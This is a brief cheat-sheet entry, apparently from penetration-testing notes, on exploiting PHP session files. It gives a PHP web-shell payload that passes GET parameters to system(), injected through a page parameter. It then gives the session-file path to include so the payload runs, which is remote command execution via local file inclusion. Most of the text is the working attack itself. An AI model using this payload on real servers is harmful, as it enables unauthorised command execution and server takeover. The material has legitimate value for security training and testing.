### Session Files

Sometimes we could exploit session files with a payload like this:

```URL
sessions.php?page=<?php system($_GET['cmd']);?>
```

Then we access the URL with the following path:

```URL
sessions.php?page=/var/lib/php/sessions/sess_[sessionID]
```

Where `[sessionID]` is value from your PHPSESSID cookie. (Could be found in Application tap in inspect elements)